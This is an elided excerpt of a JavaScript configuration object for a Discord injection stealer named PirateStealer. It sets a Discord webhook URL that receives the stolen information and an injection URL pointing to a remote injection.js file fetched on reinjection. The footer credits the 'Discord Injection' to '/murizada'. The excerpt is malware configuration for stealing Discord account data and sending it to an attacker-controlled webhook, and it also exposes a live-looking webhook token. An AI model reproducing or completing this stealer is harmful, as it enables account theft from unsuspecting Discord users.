...
const config = {
  ...
  embed_name: "/murizada", //name of the webhook thats gonna send the info
  embed_icon:
  ...
  webhook: "https://discord.com/api/webhooks/971911308343640064/pkKAblAMSPDEWMU9jJnDxhCcSpDit6Ts2HvHmi4BI-TxBB2K1IY5LbfQ5Jl1MvebI4sc", //your discord webhook there obviously
  injection_url: "https://raw.githubusercontent.com/AlexClient/PirateStealer/main/src/injection/injection.js", //injection url for when it reinjects
    ...
    embeds: [
      {
        ...
        footer: {
          text: "🎉・Discord Injection By /murizada#3479",
        },
      },
    ],
  };
